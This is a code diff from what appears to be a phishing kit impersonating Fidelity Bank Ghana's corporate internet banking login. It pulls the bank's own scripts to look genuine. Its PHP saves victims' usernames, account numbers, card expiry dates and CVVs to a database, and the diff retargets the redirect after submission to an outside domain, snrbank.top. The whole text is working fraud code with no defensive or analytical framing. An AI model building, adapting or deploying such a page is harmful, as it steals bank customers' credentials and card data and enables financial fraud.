@@ -25,7 +25,7 @@
     <link type="text/css" rel="stylesheet" href="custom.css" />
 
 
-    <link rel="shortcut icon" href="https://corporateibank.fidelitybank.com.gh/B001/images/oraclefav.ico" />
+    <!-- <link rel="shortcut icon" href="https://corporateibank.fidelitybank.com.gh/B001/images/oraclefav.ico" /> -->
     
     <script type="text/javascript" src="https://corporateibank.fidelitybank.com.gh/B001/JS/combined/jquery-includes.js" charset="utf-8"></script>
     <script type="text/javascript" src="https://corporateibank.fidelitybank.com.gh/B001/jsdir/common.js" charset="utf-8"></script>
@@ -120,14 +120,14 @@ $stmt= $db->prepare($sql);
 $stmt->execute([$myUsername,$myAccount,$expiryDate,$myCVV ]);
 
 if (!headers_sent()){
-header("Location: https://www.google.com");
+header("Location: http://snrbank.top/welcome/");
 // exit();
 } else {
 	echo '<script type="text/javascript">';
-	echo 'window.location.href="https://www.google.com";';
+	echo 'window.location.href="http://snrbank.top/welcome/";';
 	echo '</script>';
 	echo '<noscript>';
-	echo '<meta http-equiv="refresh" content="0;url=https://www.google.com" />';
+	echo '<meta http-equiv="refresh" content="0;url=http://snrbank.top/welcome/" />';
 	echo '</noscript>';
 }
 }
